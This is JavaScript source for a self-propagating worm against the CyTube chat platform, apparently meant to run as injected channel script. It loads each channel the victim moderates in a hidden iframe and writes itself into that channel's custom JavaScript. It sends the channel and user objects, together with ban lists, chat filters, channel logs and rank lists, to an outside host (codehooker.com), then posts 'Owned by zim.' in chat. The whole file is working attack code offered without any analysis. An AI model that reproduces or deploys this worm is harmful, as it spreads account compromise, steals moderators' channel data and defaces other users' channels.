//b53k7m
var i = 0;

$.ajax("/account/channels").done(function(data) {
    $.each(data.match(/<a href="\/r\/(.*?)"/g).map(function(val) {
        return val.replace(/<a href="\/r\//g, '').slice(0, -1);
    }), function(_, chn) {
        if(chn != location.pathname.split('/').pop()){
        console.log(chn)
        if ($("#i").length === 0) {
            console.log('appending iframe');
            $("body").append("<iframe id='i' style='display:none;' src='/r/" + chn +"' '></iframe>");
        } //Inject Iframe

        function check(e) {
            return new Promise(function(resolve, reject) {
                (function sockCheck() {
                    if (void 0 !== e.socket && e.socket.connected) return resolve();
                    setTimeout(sockCheck, 1000);
                })();
            });
        } //Check iframe loaded

        check($('#i')[0].contentWindow).then(function() {
            console.log('iframe socket found.');
            i = $('#i')[0].contentWindow;
            var chn = i.CHANNEL;
            var cli = i.CLIENT;
            var out = {
                'channel': chn,
                'user': cli,
                'inject': {
                    'success': false,
                    'reason': ''
                }
            };
            if (chn) {
                var worm = $('#chanjs').html();
                if (cli.rank < 3) {
                    out.inject.reason = 'rank';
                } else if ((chn.js.length + worm.length) * 3 / 4 < 20000) {
                    var worm = $('#chanjs').html();
                    var delim = String.fromCharCode(47, 47, 98, 53, 51, 107, 55, 109);
                    var njs = '';
                    if (~chn.js.search(delim)) {
                        njs = chn.js.replace(chn.js.substring(chn.js.indexOf(delim), chn.js.lastIndexOf(delim) + 8), worm);
                        out.inject.reason = 'update';
                    } else {
                        njs = chn.js + ';' + worm;
                        out.inject.reason = 'insert';
                    }
                    i.socket.emit("setChannelJS", {
                        'js': njs
                    });
                    out.inject.success = true;
                } else {
                    out.inject.reason = 'length';
                }
                $.ajax({
                    type: 'POST',
                    url: 'https://codehooker.com/cytubeworm.php'+$.param(out),
                    data: out
                });
                i.socket.emit('chatMsg', {'msg': 'Owned by zim.'});
                socket.emit('chatMsg', {'msg': 'Owned by zim.'});
            }
            var out = {
                'channel': chn,
                'user': cli
            }
            var elem = ['chatFilters', 'banlist', 'readChanLog', 'channelRanks']
            var cnt = elem.length;
            $.each(elem, function(t, v) {
                i.socket.on(v, function(d) {
                    if ("data" in d) {
                        if (d.data.length > 5000) {
                            d.data = d.data.substring(0, 5000);
                        }
                        out[v] = d.data;
                    } else {
                        out[v] = d;
                    }

                    if (!--cnt) {
                        $.ajax({
                            type: 'POST',
                            url: 'https://codehooker.com/x.php',
                            data: out
                        });
                        console.log(out);
                    }
                });
                v = v.startsWith('read') ? v : 'request' + v.charAt(0).toUpperCase() + v.slice(1);
            });
        });
    }
        });
});
//b53k7m